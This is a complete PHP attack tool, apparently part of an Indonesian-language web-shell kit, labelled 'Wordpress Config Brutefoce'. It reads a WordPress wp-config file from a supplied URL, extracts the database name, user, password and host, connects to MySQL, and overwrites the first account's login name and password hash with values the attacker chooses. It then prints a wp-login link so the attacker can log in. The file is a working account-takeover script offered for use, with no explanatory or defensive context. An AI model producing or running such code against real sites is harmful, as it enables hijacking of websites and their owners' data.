<?php
{ error_reporting(0);
if ($_POST['kill']) 
{$url = $_POST['url'];$user = $_POST['user'];$pass =$_POST['pass'];$pss = md5($pass);
function enter($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);
return $explode[0];}$config = file_get_contents($url);$password =  enter($config,"define('DB_PASSWORD', '","');");
$username =  enter($config,"define('DB_USER', '","');");$db =  enter($config,"define('DB_NAME', '","');");
$prefix =  enter($config,'$table_prefix  = \'',"';");$host =  enter($config,"define('DB_HOST', '","');");


if($config && preg_match('/DB_NAME/i',$config)){$conn= @mysql_connect($host,$username ,$password ) or die ("i can't connect to mysql, check your data");
@mysql_select_db($db,$conn) or die (mysql_error());
$grab = @mysql_query("SELECT * from  `wp_options` WHERE option_name='home'");
$data = @mysql_fetch_array($grab);$site_url = $data["option_value"];
$query = mysql_query("UPDATE `".$prefix."users` SET `user_login` = '".$user."',`user_pass` = '".$pss."' WHERE `ID` = 1");

if ($query) 
{echo '<center><h2 class="HsH">Berhasil</center></h2>
<br><table width="100%"><tr><th width="20%">site</th>
<th width="20%">user</th><th with="20%">password</th>
<th width="20%">link</th></tr><tr><td width="20%">
<font size="2" color="red">'.$site_url.'</font></td><td width="20%">'.$user.'</td>
<td with="20%">'.$pass.'</td><td width="20%">
<a href="'.$site_url.'/wp-login.php">
<font color="#00ff00">login</font></td></tr></table>';} 
else echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';} 
else die('<center><h2 class="HsH">Wordpress config Salah Cok</h2></center>');
exit;
} 
else {  

echo "<center><br><br><div class=\"mybox\">
<form method=\"post\">
<h2 style='font-size:26px;' class='HsH'>Wordpress Config Brutefoce</h2><br>
<table><tr><td>config link&nbsp;:&nbsp;</td>
<td><input size=\"26\" class=\"inputz\" type=\"text\" name=\"url\" value=\"\"></td></tr>
<tr><td>new user&nbsp;:&nbsp;</td>
<td><input class=\"inputz\" type=\"text\" name=\"user\" size=\"26\" value=\"admin\"></td></tr>
<tr><td>new password&nbsp;:&nbsp;</td>
<td><input class=\"inputz\" type=\"text\" size=\"26\" name=\"pass\" value=\"HsH1337\"></td></tr><tr><td><br></td></tr>
<tr><td><center><input class=\"inputzbut\" type=\"submit\" name=\"kill\" value=\" Ganti \"></center></td>
<br></tr></table></form></div></center>";
} 
} 
?>
